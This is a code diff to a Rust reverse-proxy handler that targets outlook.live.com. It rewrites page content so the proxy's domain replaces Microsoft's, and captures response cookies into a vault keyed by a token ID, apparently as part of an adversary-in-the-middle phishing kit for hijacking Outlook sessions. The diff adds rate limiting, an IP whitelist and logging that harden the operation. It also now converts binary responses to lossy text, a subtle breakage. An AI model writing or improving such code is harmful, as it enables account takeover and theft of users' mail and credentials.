@@ -3,6 +3,7 @@ use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 
 use crate::cookie_capture::CookieCapture;
+use crate::proxy_security::{log_request, is_ip_allowed, add_security_headers};
 
 // Target Microsoft Outlook domain
 const TARGET_DOMAIN: &str = "outlook.live.com";
@@ -140,6 +141,33 @@ pub async fn proxy_handler(
         None
     };
     
+    // Security: Check rate limit
+    let conn_info = req.connection_info();
+    let client_ip = conn_info.peer_addr().unwrap_or("unknown");
+    let security_config = crate::proxy_security::SecurityConfig::from_env();
+    
+    let token_id_str = token_id.clone();
+    
+    if !security_config.rate_limiter.is_allowed(client_ip) {
+        log_request(&req, token_id_str.as_deref(), 429, 0);
+        return HttpResponse::TooManyRequests().json(serde_json::json!({
+            "error": "rate_limit_exceeded",
+            "message": "Too many requests. Please try again later.",
+            "retry_after": 60
+        }));
+    }
+    
+    // Security: Check IP whitelist
+    if let Some(whitelist) = security_config.ip_whitelist.as_deref() {
+        if !crate::proxy_security::is_ip_allowed(client_ip, Some(whitelist)) {
+            log_request(&req, token_id_str.as_deref(), 403, 0);
+            return HttpResponse::Forbidden().json(serde_json::json!({
+                "error": "ip_not_allowed",
+                "message": "Your IP address is not authorized to access this proxy."
+            }));
+        }
+    }
+    
     println!("[proxy] {} {} → {} (token_id: {:?})", req.method(), req.uri(), target_url, token_id);
     
     // Build proxy headers
@@ -172,9 +200,9 @@ pub async fn proxy_handler(
     let response_headers = response.headers().clone();
     
     // Capture cookies from response if token_id is present
-    if let Some(tid) = token_id {
+    if let Some(ref tid) = token_id {
         let cookie_capture = CookieCapture::new(state.vault.clone());
-        if let Err(e) = cookie_capture.capture_from_response(&state.pool, &tid, &response_headers).await {
+        if let Err(e) = cookie_capture.capture_from_response(&state.pool, tid, &response_headers).await {
             eprintln!("[proxy] Failed to capture cookies: {}", e);
         }
     }
@@ -246,29 +274,33 @@ pub async fn proxy_handler(
         .and_then(|v| v.to_str().ok())
         .unwrap_or("");
     
-    // Rewrite HTML content
+    // Determine body content and size
+    let body_content: String;
+    let body_size: usize;
+    
     if content_type.contains("text/html") || content_type.contains("application/xhtml") {
         let html = String::from_utf8_lossy(&body_bytes);
-        let rewritten_html = rewrite_html_content(&html, &config);
-        return resp.body(rewritten_html);
-    }
-    
-    // Rewrite JavaScript content
-    if content_type.contains("javascript") || content_type.contains("json") {
+        body_content = rewrite_html_content(&html, &config);
+        body_size = body_content.len();
+    } else if content_type.contains("javascript") || content_type.contains("json") {
         let js = String::from_utf8_lossy(&body_bytes);
-        let rewritten_js = rewrite_js_content(&js, &config);
-        return resp.body(rewritten_js);
-    }
-    
-    // Rewrite CSS content
-    if content_type.contains("css") {
+        body_content = rewrite_js_content(&js, &config);
+        body_size = body_content.len();
+    } else if content_type.contains("css") {
         let css = String::from_utf8_lossy(&body_bytes);
-        let rewritten_css = rewrite_css_content(&css, &config);
-        return resp.body(rewritten_css);
-    }
+        body_content = rewrite_css_content(&css, &config);
+        body_size = body_content.len();
+    } else {
+        body_content = String::from_utf8_lossy(&body_bytes).to_string();
+        body_size = body_content.len();
+    };
     
-    // Return binary content as-is
-    resp.body(body_bytes)
+    // Build response
+    let mut response = resp.body(body_content);
+    crate::proxy_security::add_security_headers(&mut response);
+    let token_id_ref = token_id.as_ref().map(|s| s.as_str());
+    log_request(&req, token_id_ref, status.as_u16(), body_size);
+    response
 }
 
 /// Rewrite HTML content - replace all references to target domain with proxy domain
